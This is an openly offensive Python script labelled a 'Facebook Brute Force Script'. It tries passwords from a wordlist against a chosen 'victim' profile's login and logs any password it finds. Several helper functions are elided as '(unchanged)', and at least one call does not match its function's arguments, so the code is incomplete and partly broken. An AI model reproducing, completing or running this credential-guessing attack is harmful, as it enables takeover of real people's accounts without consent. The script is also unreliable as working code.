import socket
import requests
import random
import re
import argparse
import logging

# Colors
blue = "\033[1;34m"
wi = "\033[1;37m"
rd = "\033[1;31m"
gr = "\033[1;32m"
yl = "\033[1;33m"

# ASCII art for Anonymous style
anonymous_art = """
    ██╗      █████╗ ███████╗███████╗██╗  ██╗
    ██║     ██╔══██╗██╔════╝██╔════╝██║  ██║
    ██║     ███████║███████╗███████╗███████║
    ██║     ██╔══██║╚════██║╚════██║██╔══██║
    ███████╗██║  ██║███████║███████║██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
"""

logging.basicConfig(filename='bruteforce.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def check_network():
    try:
        ip = socket.gethostbyname("www.google.com")
        con = socket.create_connection((ip, 80), 2)
        return True
    except socket.error:
        return False

def check_proxy(ip, port=None):
    # ... (unchanged)

def get_user_agent():
    # ... (unchanged)

def get_profile_id(url):
    try:
        # ... (unchanged)
        return profile_id[0], email[0]
    except IndexError:
        logging.error("Error: Please Check Your Victim Profile URL")
        exit(1)

def brute_force(url, profile_id, wordlist):
    try:
        session = requests.Session()
        session.headers['User-Agent'] = get_user_agent()

        for password in wordlist:
            payload = {
                'email': profile_id[1],
                'pass': password
            }
            response = session.post(url + profile_id[0], data=payload)

            if "Login failed" not in response.text:
                print(blue + f"\n[*] Password Found: {yl}{password}{wi}")
                logging.info(f"Password found: {password}")
                break

    except Exception as e:
        logging.error(f"Error: {e}")
        exit(1)

if __name__ == "__main__":
    print(wi + anonymous_art + "\n")

    parser = argparse.ArgumentParser(description='Facebook Brute Force Script')
    parser.add_argument('-t', '--target-id', dest='profile_id', help='Target profile ID', required=True)
    parser.add_argument('-p', '--password-list', dest='wordlist', help='Password list file path', required=True)
    args = parser.parse_args()

    if not check_network():
        logging.error("No internet connection. Exiting.")
        exit(1)

    url = 'https://www.facebook.com/'
    profile_id = get_profile_id(url)

    wordlist_path = args.wordlist if args.wordlist else 'darkweb2017-top10000.txt'
    
    with open(wordlist_path, 'r') as f:
        wordlist = [line.strip() for line in f.readlines()]

    logging.info("Brute force started.")
    brute_force(url, profile_id, wordlist)
    logging.info("Brute force completed.")
